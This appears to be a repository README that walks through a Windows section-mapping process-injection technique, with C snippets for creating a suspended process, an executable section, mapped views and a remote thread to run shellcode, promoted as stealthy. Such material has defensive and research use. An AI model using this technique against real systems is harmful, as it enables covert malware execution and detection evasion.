# Overview

This method is focused on creating a new section which holds arbitrary code.

This executable section will be populated with arbitrary code which will run simultaneously with the main thread of the target application.
This technique is stealthier than the `CreatePatched` one since there are no apperent signs of malware being executed.
For demonstration purposes, the target process will be manually created since we do not want to inject into already running applications in our system.

For the sake of clarity, from now on the executable that is injecting the code will be referred as **injector** process while the application which will be attacked
will be the **target** process.

# Process creation

The first thing that has to be done is to create a legit process with [`CreateProcess()`][CreateProcess]. This is accomplished in this way: 
[(source)](CreateSection.cpp#L99-L113)
```c
if (!CreateProcessW((LPWSTR)app_path, // lpApplicationName
                      NULL,             // lpCommandLine
                      NULL,             // lpProcessAttributes
                      NULL,             // lpThreadAttributes
                      NULL,             // bInheritHandles
                      CREATE_SUSPENDED | DETACHED_PROCESS |
                          CREATE_NO_WINDOW, // dwCreationFlags
                      NULL,                 // lpEnvironment
                      NULL,                 // lpCurrentDirectory
                      &si,                  // lpStartupInfo
                      &pi                   // lpProcessInformation
                      )) {
    DBG_ERROR(("CreateProcess failed with error 0x%x\n", GetLastError()));
    return -1;
  }
```
Note the `CREATE_SUSPENDED` flag stops the application from starting automatically after the function call.
If the operation succeeds, the `pi` structure will contain all the information about the newly spawned process.

The execution of the application will be resumed later.

# Section creation 

It is now time to create the executable section. It will not be bind to any process, yet.
[(source)](CreateSection.cpp#L119-L124)
```c
  if ((status = ZwCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &maxSize,
                                PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) !=
      STATUS_SUCCESS) {
    DBG_ERROR(("ZwCreateSection failed, status : %x\n", status));
    return -1;
  }
```
There are several important variables being passed to [`ZwCreateSection()`][ZwCreateSection]: `&hSection`, `SECTION_ALL_ACCESS` and `PAGE_EXECUTE_READWRITE`.

* `hSection` is the section handle: it will represent our new section.

* `SECTION_ALL_ACCESS` is a bitwise flag which basically grants every permission to the section.

* `PAGE_EXECUTE_READWRITE` makes the section's memory page readable, writeable and **executable**.

# Memory mapping

In order to write into the section, we will have to map a view, a whole or partial mapping of a section object, in the virtual address space of a process.

![MapSection]

The first step is to bind the section to the **injector** process' context in order to copy the shellcode in it. This is done with [`NtMapViewOfSection()`][NtMapViewOfSection]: its
second parameter, in this case the `HANDLE` returned by [`GetCurrentProcess()`][GetCurrentProcess], defines in which process' the section will be mapped.
[(source)](CreateSection.cpp#L128-L134)
```c
  if ((status = NtMapViewOfSection(hSection, GetCurrentProcess(),
                                   &sectionBaseAddress, NULL, NULL, NULL,
                                   &viewSize, inheritDisposition, NULL,
                                   PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS) {
    DBG_ERROR(("NtMapViewOfSection failed, status : %x\n", status));
    return -1;
  }
```
Once the shellcode has been copied, we can proceed to map the section into the **target** process.
[(source)](CreateSection.cpp#L142-L148)
```c
  if ((status =
           NtMapViewOfSection(hSection, pi.hProcess, &sectionBaseAddress2, NULL,
                              NULL, NULL, &viewSize, inheritDisposition, NULL,
                              PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS) {
    DBG_ERROR(("NtMapViewOfSection failed, status : %x\n", status));
    return -1;
  }
```
Finally, we have to unmap the view from the **injector**. The section handle `hSection` is closed and set to `NULL` afterwards.
[(source)](CreateSection.cpp#L152-L154)
```c
ZwUnmapViewOfSection(GetCurrentProcess(), sectionBaseAddress);
ZwClose(hSection);
hSection = NULL;
```

# Shellcode execution

The last thing to check out is the actual shellcode execution. This can be achieved by creating, and later starting, a new thread which points
to the section containing the shellcode.
[(source)](CreateSection.cpp#L158-L167)
```c
  if ((status = ZwCreateThreadEx(&threadHandle, 0x1FFFFF, NULL, pi.hProcess,
                                 sectionBaseAddress2, NULL, CREATE_SUSPENDED, 0,
                                 0, 0, 0)) != STATUS_SUCCESS) {
    DBG_ERROR(("ZwCreateThreadEx failed, status : %x\n", status));
    return -1;
  }
  DBG_SUCC(("Thread created. PID = %p\n", threadHandle));
  DBG_INFO(("Resuming threads...\n"));

  ResumeThread(pi.hThread);   // main Thread of calc.exe
  ResumeThread(threadHandle); // injection
```

# Resources

* [Source](CreateSection.cpp)
* [Header](CreateSection.h)

[MapSection]: ../resources/MapSection.png?raw=true
[CreateProcess]: https://msdn.microsoft.com/en-us/library/windows/desktop/ms682425(v=vs.85).aspx
[GetCurrentProcess]: https://msdn.microsoft.com/en-us/library/windows/desktop/ms683179(v=vs.85).aspx
[VirtualProtectEx]: https://msdn.microsoft.com/en-us/library/windows/desktop/aa366899(v=vs.85).aspx
[ZwCreateSection]: https://msdn.microsoft.com/en-us/library/windows/hardware/ff566428(v=vs.85).aspx
[NtMapViewOfSection]: https://msdn.microsoft.com/en-us/library/windows/hardware/ff556551(v=vs.85).aspx